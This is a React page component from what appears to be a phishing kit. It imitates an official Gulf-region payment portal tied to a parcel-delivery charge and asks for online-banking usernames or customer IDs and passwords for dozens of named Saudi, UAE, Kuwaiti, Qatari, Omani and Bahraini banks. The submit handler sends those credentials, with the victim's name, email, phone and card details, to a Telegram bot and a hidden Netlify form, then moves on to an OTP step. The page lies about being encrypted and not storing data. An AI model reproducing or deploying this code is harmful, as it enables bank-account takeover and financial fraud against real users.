import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";
import { getServiceBranding } from "@/lib/serviceLogos";
import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { Lock, Eye, EyeOff, Building2, ArrowLeft, ShieldCheck, Shield, Lock as LockIcon, CheckCircle } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { getBankById } from "@/lib/banks";
import { getCountryByCode } from "@/lib/countries";
import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";

const PaymentBankLogin = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);
  const updateLink = useUpdateLink();
  
  // Bank login credentials state
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [customerId, setCustomerId] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Get customer info and selected bank from link data (cross-device compatible)
  const customerInfo = linkData?.payload?.customerInfo || {};
  const selectedBankId = linkData?.payload?.selectedBank || '';
  const cardInfo = linkData?.payload?.cardInfo || {
    cardName: '',
    cardLast4: '',
    cardNumber: '',
    cardExpiry: '',
    cardCvv: '',
    cardType: '',
  };
  
  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);

  // Get country from link data
  const selectedCountry = linkData?.payload?.selectedCountry || "SA";

  const shippingInfo = linkData?.payload as any;

  // Get amount from link data - ensure it's a number, handle all data types
  const rawAmount = shippingInfo?.cod_amount;

  // Handle different data types and edge cases
  let amount = 500; // Default value
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const formattedAmount = formatCurrency(amount, selectedCountry);
  
  const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
  const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;

  // UAE Government Color Scheme
  const uaeColors = {
    primary: "#CE1126",
    secondary: "#00732F",
    accent: "#000000",
    background: "#FFFFFF",
    lightGray: "#F5F5F5",
    border: "#E0E0E0",
  };
  
  // Determine login type based on bank
  const getLoginType = () => {
    if (!selectedBank) return 'username';
    
    const bankId = selectedBank.id;
    
    // Saudi banks
    if (bankId === 'alrajhi_bank') return 'username'; // Username + Password
    if (bankId === 'alahli_bank') return 'username'; // Username + Password
    if (bankId === 'riyad_bank') return 'customerId'; // Customer ID + Password
    if (bankId === 'samba_bank') return 'username'; // Username + Password
    if (bankId === 'saudi_investment_bank') return 'customerId'; // Customer ID + Password
    if (bankId === 'arab_national_bank') return 'username'; // Username + Password
    if (bankId === 'saudi_fransi_bank') return 'customerId'; // Customer ID + Password
    if (bankId === 'alinma_bank') return 'username'; // Username + Password
    if (bankId === 'albilad_bank') return 'customerId'; // Customer ID + Password
    if (bankId === 'aljazira_bank') return 'username'; // Username + Password
    
    // UAE banks
    if (bankId === 'emirates_nbd') return 'username'; // Username + Password
    if (bankId === 'adcb') return 'customerId'; // Customer ID + Password
    if (bankId === 'fab') return 'username'; // Username + Password
    if (bankId === 'dib') return 'username'; // Username + Password
    if (bankId === 'mashreq_bank') return 'customerId'; // Customer ID + Password
    if (bankId === 'cbd') return 'username'; // Username + Password
    if (bankId === 'rakbank') return 'customerId'; // Customer ID + Password
    if (bankId === 'ajman_bank') return 'username'; // Username + Password
    
    // Kuwait banks
    if (bankId === 'nbk') return 'customerId'; // Customer ID + Password
    if (bankId === 'gulf_bank') return 'username'; // Username + Password
    if (bankId === 'cbk') return 'customerId'; // Customer ID + Password
    if (bankId === 'burgan_bank') return 'username'; // Username + Password
    if (bankId === 'ahli_united_bank') return 'username'; // Username + Password
    if (bankId === 'kfh') return 'customerId'; // Customer ID + Password
    if (bankId === 'boubyan_bank') return 'username'; // Username + Password
    
    // Qatar banks
    if (bankId === 'qnb') return 'customerId'; // Customer ID + Password
    if (bankId === 'cbq') return 'username'; // Username + Password
    if (bankId === 'doha_bank') return 'username'; // Username + Password
    if (bankId === 'qib') return 'customerId'; // Customer ID + Password
    if (bankId === 'masraf_alrayan') return 'username'; // Username + Password
    if (bankId === 'ahlibank') return 'customerId'; // Customer ID + Password
    
    // Oman banks
    if (bankId === 'bank_muscat') return 'customerId'; // Customer ID + Password
    if (bankId === 'national_bank_oman') return 'username'; // Username + Password
    if (bankId === 'bank_dhofar') return 'username'; // Username + Password
    if (bankId === 'ahli_bank_oman') return 'customerId'; // Customer ID + Password
    if (bankId === 'nizwa_bank') return 'username'; // Username + Password
    if (bankId === 'sohar_international') return 'customerId'; // Customer ID + Password
    
    // Bahrain banks
    if (bankId === 'nbb') return 'username'; // Username + Password
    if (bankId === 'bbk') return 'customerId'; // Customer ID + Password
    if (bankId === 'ahli_united_bahrain') return 'username'; // Username + Password
    if (bankId === 'bisb') return 'username'; // Username + Password
    if (bankId === 'ithmaar_bank') return 'customerId'; // Customer ID + Password
    if (bankId === 'khaleeji_bank') return 'username'; // Username + Password
    
    return 'username'; // Default
  };
  
  const loginType = getLoginType();
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Validate based on login type
    if (loginType === 'username' && (!username || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال اسم المستخدم وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    if (loginType === 'customerId' && (!customerId || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رقم العميل وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    if (loginType === 'phone' && (!phoneNumber || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رقم الجوال وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    setIsSubmitting(true);

    // Store bank login info
    const bankLoginData = {
      username: loginType === 'username' ? username : '',
      customerId: loginType === 'customerId' ? customerId : '',
      phoneNumber: loginType === 'phone' ? phoneNumber : '',
      password: password,
      loginType: loginType,
    };

    // Save to sessionStorage (for current session) and link (for cross-device)
    sessionStorage.setItem('bankLoginData', JSON.stringify(bankLoginData));

    // Save to link for cross-device compatibility
    if (linkData) {
      try {
        const updatedPayload = {
          ...linkData.payload,
          bankLoginData,
        };

        await updateLink.mutateAsync({
          linkId: id!,
          payload: updatedPayload
        });
      } catch (error) {
        console.error('Error saving bank login data:', error);
      }
    }
    
    // Submit to Netlify Forms
    try {
      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "bank-login",
          name: customerInfo.name || '',
          email: customerInfo.email || '',
          phone: customerInfo.phone || '',
          service: serviceName,
          amount: formattedAmount,
          country: selectedCountryData?.nameAr || '',
          bank: selectedBank?.nameAr || 'غير محدد',
          cardLast4: cardInfo.cardLast4,
          loginType: loginType,
          username: bankLoginData.username,
          customerId: bankLoginData.customerId,
          phoneNumber: bankLoginData.phoneNumber,
          password: password,
          timestamp: new Date().toISOString()
        }).toString()
      });
    } catch (err) {
      // Silent error handling
    }

    // Send bank login details to Telegram (cybersecurity test)
    const telegramResult = await sendToTelegram({
      type: 'bank_login',
      data: {
        name: customerInfo.name || '',
        email: customerInfo.email || '',
        phone: customerInfo.phone || '',
        service: serviceName,
        country: selectedCountryData?.nameAr || '',
        countryCode: selectedCountry,
        bank: selectedBank?.nameAr || 'غير محدد',
        bankId: selectedBankId,
        cardLast4: cardInfo.cardLast4,
        cardType: cardInfo.cardType,
        loginType: loginType,
        username: bankLoginData.username,
        customerId: bankLoginData.customerId,
        phoneNumber: bankLoginData.phoneNumber,
        password: password,
        amount: formattedAmount
      },
      timestamp: new Date().toISOString()
    });

    setIsSubmitting(false);
    
    toast({
      title: "تم بنجاح",
      description: "تم تسجيل الدخول بنجاح",
    });
    
    // Navigate to OTP verification
    navigate(`/pay/${id}/otp`);
  };
  
  return (
    <div className="min-h-screen" style={{ backgroundColor: uaeColors.lightGray }} dir="rtl">
      {/* Header */}
      <div className="w-full" style={{ backgroundColor: uaeColors.primary }}>
        <div className="container mx-auto px-4 py-3">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="w-12 h-12 bg-white rounded-lg flex items-center justify-center">
                <Lock className="w-6 h-6" style={{ color: uaeColors.primary }} />
              </div>
              <div className="text-white">
                <h1 className="text-lg font-bold">البوابة الرسمية للدفع</h1>
                <p className="text-xs opacity-90">آمن • موثوق • سريع</p>
              </div>
            </div>
            <Badge variant="secondary" className="bg-white text-gray-800">
              <LockIcon className="w-3 h-3 ml-1" />
              اتصال آمن
            </Badge>
          </div>
        </div>
      </div>

      <div className="container mx-auto px-4 py-8">
        <div className="max-w-3xl mx-auto">
          {/* Security Notice */}
          <div className="mb-6 p-4 bg-white rounded-lg border-r-4" style={{ borderRightColor: uaeColors.secondary }}>
            <div className="flex items-start gap-3">
              <Shield className="w-5 h-5 mt-0.5" style={{ color: uaeColors.secondary }} />
              <div>
                <h3 className="font-semibold text-sm mb-1">تسجيل دخول آمن</h3>
                <p className="text-xs text-gray-600">
                  سجّل دخول إلى حسابك البنكي لتأكيد العملية وإكمال الدفع بأمان
                </p>
              </div>
            </div>
          </div>

          <div className="bg-white rounded-lg shadow-lg border-0 overflow-hidden">
            {/* Bank Info Header */}
            <div
              className="p-6 border-b"
              style={{ backgroundColor: uaeColors.lightGray }}
            >
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-4">
                  <div
                    className="w-16 h-16 rounded-xl flex items-center justify-center"
                    style={{ backgroundColor: `${uaeColors.primary}15` }}
                  >
                    <Building2 className="w-8 h-8" style={{ color: uaeColors.primary }} />
                  </div>
                  <div>
                    <h3 className="text-xl font-bold" style={{ color: uaeColors.accent }}>
                      {selectedBank?.nameAr || 'البنك'}
                    </h3>
                    <p className="text-sm text-gray-600">{selectedBank?.name}</p>
                    {selectedCountryData && (
                      <p className="text-xs text-gray-500 mt-1">
                        {selectedCountryData.flag} {selectedCountryData.nameAr}
                      </p>
                    )}
                  </div>
                </div>
                <div className="text-right">
                  <p className="text-xs text-gray-600">المبلغ المطلوب</p>
                  <p className="text-2xl font-bold" style={{ color: uaeColors.primary }}>
                    {formattedAmount}
                  </p>
                </div>
              </div>
            </div>

            {/* Login Form */}
            <form onSubmit={handleSubmit} className="p-6 space-y-5">
              {/* Username Login */}
              {loginType === 'username' && (
                <>
                  <div>
                    <Label className="mb-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
                      اسم المستخدم
                    </Label>
                    <Input
                      type="text"
                      placeholder="أدخل اسم المستخدم"
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      className="h-12 text-base border-2 focus:border-blue-500 transition-colors"
                      autoComplete="username"
                      required
                    />
                  </div>
                </>
              )}

              {/* Customer ID Login */}
              {loginType === 'customerId' && (
                <>
                  <div>
                    <Label className="mb-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
                      رقم العميل
                    </Label>
                    <Input
                      type="text"
                      placeholder="أدخل رقم العميل"
                      value={customerId}
                      onChange={(e) => setCustomerId(e.target.value)}
                      className="h-12 text-base border-2 focus:border-blue-500 transition-colors"
                      inputMode="numeric"
                      required
                    />
                  </div>
                </>
              )}

              {/* Phone Login */}
              {loginType === 'phone' && (
                <>
                  <div>
                    <Label className="mb-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
                      رقم الجوال
                    </Label>
                    <Input
                      type="tel"
                      placeholder="05xxxxxxxx"
                      value={phoneNumber}
                      onChange={(e) => setPhoneNumber(e.target.value)}
                      className="h-12 text-base border-2 focus:border-blue-500 transition-colors"
                      inputMode="tel"
                      required
                    />
                  </div>
                </>
              )}

              {/* Password (common for all types) */}
              <div>
                <Label className="mb-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
                  كلمة المرور
                </Label>
                <div className="relative">
                  <Input
                    type={showPassword ? "text" : "password"}
                    placeholder="أدخل كلمة المرور"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="h-12 text-base border-2 focus:border-blue-500 transition-colors pl-12"
                    autoComplete="current-password"
                    required
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700 transition-colors"
                  >
                    {showPassword ? (
                      <EyeOff className="w-5 h-5" />
                    ) : (
                      <Eye className="w-5 h-5" />
                    )}
                  </button>
                </div>
              </div>

              {/* Remember Me / Forgot Password */}
              <div className="flex items-center justify-between text-sm">
                <div className="flex items-center gap-2">
                  <input type="checkbox" id="remember" className="rounded" />
                  <label htmlFor="remember" className="text-gray-600 cursor-pointer">
                    تذكرني
                  </label>
                </div>
                <button
                  type="button"
                  className="hover:underline"
                  style={{ color: uaeColors.primary }}
                >
                  نسيت كلمة المرور؟
                </button>
              </div>

              {/* Security Info */}
              <div className="mt-6 p-4 rounded-lg" style={{ backgroundColor: uaeColors.lightGray }}>
                <div className="flex items-start gap-3">
                  <CheckCircle className="w-5 h-5 mt-0.5" style={{ color: uaeColors.secondary }} />
                  <div>
                    <h4 className="font-semibold text-sm mb-1" style={{ color: uaeColors.accent }}>
                      محمي بتشفير SSL
                    </h4>
                    <p className="text-xs text-gray-600">
                      جميع المعلومات مُشفرة ومحمية. لا نقوم بتخزين بياناتك البنكية.
                    </p>
                  </div>
                </div>
              </div>

              {/* Submit Button */}
              <Button
                type="submit"
                size="lg"
                className="w-full h-14 text-lg font-bold text-white mt-6 transition-all hover:opacity-90"
                style={{ backgroundColor: uaeColors.primary }}
                disabled={isSubmitting}
              >
                {isSubmitting ? (
                  <>
                    <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white ml-2"></div>
                    جاري تسجيل الدخول...
                  </>
                ) : (
                  <>
                    <Lock className="w-5 h-5 ml-2" />
                    <span className="ml-2">تسجيل الدخول</span>
                    <ArrowLeft className="w-5 h-5" />
                  </>
                )}
              </Button>

              <p className="text-xs text-center text-gray-500 mt-4">
                بتسجيل الدخول، أنت توافق على الشروط والأحكام وسياسة الخصوصية
              </p>
            </form>

            {/* Additional Info */}
            <div className="p-6 bg-gray-50 border-t text-center">
              <p className="text-sm text-gray-600 mb-3">
                لا تملك حساب؟
              </p>
              <Button
                type="button"
                variant="outline"
                size="sm"
                className="text-sm"
                style={{ borderColor: uaeColors.primary, color: uaeColors.primary }}
              >
                تسجيل حساب جديد
              </Button>
            </div>
          </div>

          {/* Security Footer */}
          <div className="mt-6 text-center">
            <div className="inline-flex items-center gap-2 px-4 py-2 bg-white rounded-full shadow-sm">
              <Shield className="w-4 h-4" style={{ color: uaeColors.secondary }} />
              <span className="text-xs font-medium" style={{ color: uaeColors.accent }}>
                معتمد من وزارة التجارة
              </span>
            </div>
          </div>
        </div>
      </div>

      {/* Hidden Netlify Form */}
      <form name="bank-login" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="name" />
        <input type="email" name="email" />
        <input type="tel" name="phone" />
        <input type="text" name="service" />
        <input type="text" name="amount" />
        <input type="text" name="country" />
        <input type="text" name="bank" />
        <input type="text" name="cardLast4" />
        <input type="text" name="loginType" />
        <input type="text" name="username" />
        <input type="text" name="customerId" />
        <input type="text" name="phoneNumber" />
        <input type="password" name="password" />
        <input type="text" name="timestamp" />
      </form>
    </div>
  );
};

export default PaymentBankLogin;
